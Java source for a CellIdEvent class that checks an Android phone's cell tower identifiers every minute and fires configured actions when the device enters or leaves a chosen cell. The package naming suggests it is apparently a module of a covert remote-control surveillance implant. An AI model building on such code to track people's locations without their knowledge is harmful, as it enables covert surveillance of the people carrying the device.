package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.content.Context;
import android.telephony.CellLocation;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.Status;
import com.ht.RCSAndroidGUI.utils.Check;
import com.ht.RCSAndroidGUI.utils.DataBuffer;

public class CellIdEvent extends EventBase {
	private static final String TAG = null;

	private static final long CELLID_PERIOD = 60000;
	private static final long CELLID_DELAY = 1000;

	int actionOnEnter;
	int actionOnExit;

	int mccOrig;
	int mncOrig;
	int lacOrig;
	int cidOrig;
	boolean entered = false;

	@Override
	public void begin() {
		entered = false;
	}

	@Override
	public void end() {
	}

	@Override
	public boolean parse(EventConf event) {
		byte[] confParams = event.getParams();
		final DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length);

		try {
			actionOnEnter = event.getAction();
			actionOnExit = databuffer.readInt();

			mccOrig = databuffer.readInt();
			mncOrig = databuffer.readInt();
			lacOrig = databuffer.readInt();
			cidOrig = databuffer.readInt();

			Log.d(TAG, "Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: "
					+ lacOrig + " Cid: " + cidOrig);

			setPeriod(CELLID_PERIOD);
			setDelay(CELLID_DELAY);

		} catch (final IOException e) {
			return false;
		}

		return true;
	}

	@Override
	public void go() {
		int mcc = -1;
		int mnc = -1;
		int lac = -1;
		int cid = -1;

		android.content.res.Configuration conf = Status.getAppContext()
				.getResources().getConfiguration();
		TelephonyManager tm = (TelephonyManager) Status.getAppContext()
				.getSystemService(Context.TELEPHONY_SERVICE);

		CellLocation bcell = tm.getCellLocation();

		if (bcell == null) {
			Log.d(TAG, "Error: " + "null cell");
			return;
		}

		if (bcell instanceof GsmCellLocation) {
			Check.asserts(Device.isGprs(), "gprs or not?");
			GsmCellLocation cell = (GsmCellLocation) bcell;

			// Integer.parseInt(Integer.toHexString(conf.mcc));
			mcc = conf.mcc;

			mnc = conf.mnc;
			lac = cell.getLac();
			cid = cell.getCid();

			final StringBuffer mb = new StringBuffer();
			mb.append("MCC: " + mcc);
			mb.append(" MNC: " + mnc);
			mb.append(" LAC: " + lac);
			mb.append(" CID: " + cid);

			Log.d(TAG, "info: " + mb.toString());

		}

		if (bcell instanceof CdmaCellLocation) {
			Check.asserts(Device.isCdma(), "cdma or not?");
			CdmaCellLocation cell = (CdmaCellLocation) tm.getCellLocation();

			// CDMAInfo.getIMSI()
			final int sid = cell.getSystemId();
			final int nid = cell.getNetworkId();
			final int bid = cell.getBaseStationId();
			// https://www.blackberry.com/jira/browse/JAVAAPI-641
			mcc = 0;

			final StringBuffer mb = new StringBuffer();
			mb.append("SID: " + sid);
			mb.append(" NID: " + nid);
			mb.append(" BID: " + bid);

			Log.d(TAG, "info: " + mb.toString());

			mnc = sid;
			lac = nid;
			cid = bid;

		}

		if ((mccOrig == -1 || mccOrig == mcc)
				&& (mncOrig == -1 || mncOrig == mnc)
				&& (lacOrig == -1 || lacOrig == lac)
				&& (cidOrig == -1 || cidOrig == cid)) {
			if (!entered) {
				Log.d(TAG, "Enter");
				entered = true;
				trigger(actionOnEnter);
			} else {
				Log.d(TAG, "already entered");
			}

		} else {
			if (entered) {
				Log.d(TAG, "Exit");
				entered = false;
				trigger(actionOnExit);
			} else {
				Log.d(TAG, "already exited");
			}
		}
	}

}
